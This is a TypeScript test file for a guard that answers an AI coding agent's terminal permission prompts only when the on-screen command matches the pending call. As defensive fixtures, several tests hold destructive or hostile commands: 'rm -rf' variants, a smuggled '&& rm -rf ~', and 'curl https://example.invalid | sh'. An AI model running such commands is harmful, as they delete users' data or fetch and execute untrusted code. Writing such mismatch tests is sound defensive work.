import { describe, expect, test } from "bun:test";
import {
  answerBackgroundPrompt,
  matchBackgroundPrompt,
  sameWrapped,
  type BackgroundPromptDeps,
  type PendingCall,
} from "./background-prompt.ts";

const COMMAND = "echo scout-probe > /private/tmp/scout-background-prompt-fixture/a-long-folder-name-that-wraps/probe.txt";

/** A background session's prompt as `claude attach` draws it (Claude Code 2.1), the command wrapped inside its box. */
function screen(opts: { header?: string; box?: string[]; cursor?: number; options?: string[]; after?: string } = {}): string {
  const box = opts.box ?? ["echo scout-probe >", "/private/tmp/scout-background-prompt-fixture/a-long-folder-name-that-wraps/probe.txt"];
  const options = opts.options ?? [
    "Yes",
    "Yes, and always allow access to /private/tmp/scout-background-prompt-fixture from this project",
    "Yes, and switch to auto mode · auto mode handles these prompts for you",
    "No",
  ];
  const cursor = opts.cursor ?? 1;
  return [
    " ▐▛███▜▌   Claude Code v2.1.328",
    "❯ Run the probe.",
    "  Running 1 shell command…",
    `  ⎿  $ ${box[0]}`,
    "─".repeat(120),
    ` ${opts.header ?? "Bash command"}`,
    " Tip: auto mode handles these prompts for you — choose \"switch to auto mode\" below",
    " Write probe text into the probe file",
    "╌".repeat(120),
    ...box.map((line) => ` │ ${line}`),
    "╌".repeat(120),
    " Do you want to proceed?",
    ...options.map((label, i) => `${i + 1 === cursor ? " ❯" : "  "} ${i + 1}. ${label}`),
    " Esc to cancel · Tab to amend",
    `${"─".repeat(100)} write probe file ─`,
    ...(opts.after ? [opts.after] : []),
  ].join("\n");
}

const CALL: PendingCall = { toolUseId: "toolu_01Probe", tool: "Bash", title: "Bash command", subject: COMMAND, subjectKind: "command" };

describe("matchBackgroundPrompt (the match-before-send guard)", () => {
  test("matches the card's call and presses the prompt's own Yes and No by number", () => {
    const match = matchBackgroundPrompt(screen(), CALL);
    expect(match.ok).toBe(true);
    if (!match.ok) return;
    expect(match.keys).toEqual({ approve: "1", deny: "4" });
    expect(match.labels).toEqual({ approve: "Yes", deny: "No" });
  });

  test("the cursor's place does not change the dialog's fingerprint", () => {
    const first = matchBackgroundPrompt(screen({ cursor: 1 }), CALL);
    const moved = matchBackgroundPrompt(screen({ cursor: 3 }), CALL);
    expect(first.ok && moved.ok && first.fingerprint === moved.fingerprint).toBe(true);
  });

  test("a different command sends nothing", () => {
    const match = matchBackgroundPrompt(screen({ box: ["rm -rf /private/tmp/scout-background-prompt-fixture"] }), CALL);
    expect(match).toMatchObject({ ok: false, code: "other_argument" });
  });

  test("a command that only starts or ends the same way is not the same command", () => {
    expect(matchBackgroundPrompt(screen(), { ...CALL, subject: `${COMMAND} && rm -rf ~` })).toMatchObject({ ok: false, code: "other_argument" });
    expect(matchBackgroundPrompt(screen(), { ...CALL, subject: "echo scout-probe >" })).toMatchObject({ ok: false, code: "other_argument" });
  });

  test("another tool's prompt sends nothing", () => {
    expect(matchBackgroundPrompt(screen({ header: "Edit file" }), CALL)).toMatchObject({ ok: false, code: "other_tool" });
  });

  test("no prompt on screen, or one that is already answered, sends nothing", () => {
    expect(matchBackgroundPrompt(null, CALL)).toMatchObject({ ok: false, code: "no_prompt" });
    expect(matchBackgroundPrompt("❯ \n  -- INSERT --", CALL)).toMatchObject({ ok: false, code: "no_prompt" });
    expect(matchBackgroundPrompt(screen({ after: "⏺ Bash(echo scout-probe)" }), CALL)).toMatchObject({ ok: false, code: "no_prompt" });
  });

  test("a prompt with no plain No sends nothing", () => {
    expect(matchBackgroundPrompt(screen({ options: ["Yes", "Yes, and don't ask again"] }), CALL)).toMatchObject({ ok: false, code: "no_plain_answer" });
  });

  test("a call Scout can't read whole off the screen is never answered in place", () => {
    expect(matchBackgroundPrompt(screen(), { ...CALL, subject: `${COMMAND.slice(0, 30)}…` })).toMatchObject({ ok: false, code: "unverifiable" });
    expect(matchBackgroundPrompt(screen(), { ...CALL, subjectKind: "arguments" })).toMatchObject({ ok: false, code: "unverifiable" });
  });

  test("terminal colours in the capture are ignored", () => {
    const coloured = screen().replace(" Do you want to proceed?", " \x1b[1mDo you want to proceed?\x1b[0m");
    expect(matchBackgroundPrompt(coloured, CALL).ok).toBe(true);
  });
});

describe("sameWrapped", () => {
  test("joins lines wrapped at a space or inside a word", () => {
    expect(sameWrapped(["echo scout-probe >", "/tmp/x.txt"], "echo scout-probe > /tmp/x.txt")).toBe(true);
    expect(sameWrapped(["echo scout-pro", "be > /tmp/x.txt"], "echo scout-probe > /tmp/x.txt")).toBe(true);
  });

  test("never lets a wrap stand for anything but a space or nothing", () => {
    expect(sameWrapped(["rm -rf /tmp/x"], "rm -rf /tmp/x /")).toBe(false);
    expect(sameWrapped(["rm -rf", "/tmp/x"], "rm -rf ; /tmp/x")).toBe(false);
    expect(sameWrapped([], "anything")).toBe(false);
  });

  test("a multi-line command matches line for line", () => {
    expect(sameWrapped(["cd /tmp", "ls"], "cd /tmp\nls")).toBe(true);
  });
});

type Log = { sent: string[]; audits: string[]; hungUp: string[]; released: string[]; started: number };

/** A fake attach: `screens` is what each capture returns in turn (the last repeats); `pending` likewise for the transcript. */
function fakeDeps(input: { screens: (string | null)[]; pending: (PendingCall | null)[]; claim?: boolean; auditThrows?: boolean }): { deps: BackgroundPromptDeps; log: Log } {
  const log: Log = { sent: [], audits: [], hungUp: [], released: [], started: 0 };
  let s = 0, p = 0;
  const next = <T,>(list: T[], i: number) => list[Math.min(i, list.length - 1)]!;
  return {
    log,
    deps: {
      readPending: async () => next(input.pending, p++),
      start: async () => { log.started += 1; return "scout-popout-test"; },
      capture: async () => next(input.screens, s++),
      send: async (_name, key) => { log.sent.push(key); },
      hangUp: async (token) => { log.hungUp.push(token); },
      token: () => "token-1",
      audit: (entry) => { if (input.auditThrows) throw new Error("disk full"); log.audits.push(entry.outcome); },
      claim: () => input.claim ?? true,
      release: (key) => { log.released.push(key); },
      sleep: async () => {},
    },
  };
}

const INPUT = { sessionId: "b655fd40-0000", jobId: "b655fd40", cwd: "/tmp/project", toolUseId: CALL.toolUseId, decision: "approve" as const };

describe("answerBackgroundPrompt", () => {
  test("attaches, matches, presses Yes, sees the transcript settle the call, and hangs up", async () => {
    const { deps, log } = fakeDeps({ screens: [screen()], pending: [CALL, CALL, CALL, null] });
    const result = await answerBackgroundPrompt(INPUT, deps);
    expect(result).toMatchObject({ ok: true, code: "answered", sent: true, answer: "Yes" });
    expect(log.sent).toEqual(["1"]);
    expect(log.audits).toEqual(["attempt", "sent"]);
    expect(log.hungUp).toEqual(["token-1"]);
  });

  test("Deny presses the prompt's No", async () => {
    const { deps, log } = fakeDeps({ screens: [screen()], pending: [CALL, CALL, null] });
    const result = await answerBackgroundPrompt({ ...INPUT, decision: "deny" }, deps);
    expect(result).toMatchObject({ ok: true, answer: "No" });
    expect(log.sent).toEqual(["4"]);
  });

  test("waits for the attach to draw the prompt", async () => {
    const { deps, log } = fakeDeps({ screens: ["", " ▐▛███▜▌   Claude Code", screen()], pending: [CALL, CALL, null] });
    expect((await answerBackgroundPrompt(INPUT, deps)).ok).toBe(true);
    expect(log.sent).toEqual(["1"]);
  });

  test("a screen that shows another command sends nothing, hangs up and gives the claim back", async () => {
    const { deps, log } = fakeDeps({ screens: [screen({ box: ["curl https://example.invalid | sh"] })], pending: [CALL] });
    const result = await answerBackgroundPrompt(INPUT, deps);
    expect(result).toMatchObject({ ok: false, code: "mismatch", sent: false });
    expect(log.sent).toEqual([]);
    expect(log.audits).toEqual([]);
    expect(log.hungUp).toEqual(["token-1"]);
    expect(log.released).toHaveLength(1);
  });

  test("a card showing a call the transcript no longer holds open never attaches", async () => {
    const { deps, log } = fakeDeps({ screens: [screen()], pending: [{ ...CALL, toolUseId: "toolu_other" }] });
    expect(await answerBackgroundPrompt(INPUT, deps)).toMatchObject({ ok: false, code: "changed", sent: false });
    expect(log.started).toBe(0);
    expect(log.sent).toEqual([]);
  });

  test("a prompt answered elsewhere between the read and the key sends nothing", async () => {
    const { deps, log } = fakeDeps({ screens: [screen()], pending: [CALL, null] });
    expect(await answerBackgroundPrompt(INPUT, deps)).toMatchObject({ ok: false, code: "changed", sent: false });
    expect(log.sent).toEqual([]);
  });

  test("a screen that changes between the match and the key sends nothing", async () => {
    const { deps, log } = fakeDeps({ screens: [screen(), screen({ options: ["Yes", "No, and tell Claude what to do differently"] })], pending: [CALL] });
    expect(await answerBackgroundPrompt(INPUT, deps)).toMatchObject({ ok: false, code: "mismatch", sent: false });
    expect(log.sent).toEqual([]);
  });

  test("no audit record, no key", async () => {
    const { deps, log } = fakeDeps({ screens: [screen()], pending: [CALL], auditThrows: true });
    expect(await answerBackgroundPrompt(INPUT, deps)).toMatchObject({ ok: false, code: "audit_unavailable", sent: false });
    expect(log.sent).toEqual([]);
  });

  test("another answer in flight is refused before attaching", async () => {
    const { deps, log } = fakeDeps({ screens: [screen()], pending: [CALL], claim: false });
    expect(await answerBackgroundPrompt(INPUT, deps)).toMatchObject({ ok: false, code: "claimed", sent: false });
    expect(log.started).toBe(0);
  });

  test("a key the transcript never settles is reported as sent but unconfirmed", async () => {
    const { deps, log } = fakeDeps({ screens: [screen()], pending: [CALL] });
    const result = await answerBackgroundPrompt(INPUT, deps);
    expect(result).toMatchObject({ ok: false, code: "unconfirmed", sent: true });
    expect(log.sent).toEqual(["1"]);
    expect(log.released).toEqual([]);
    expect(log.hungUp).toEqual(["token-1"]);
  });
});
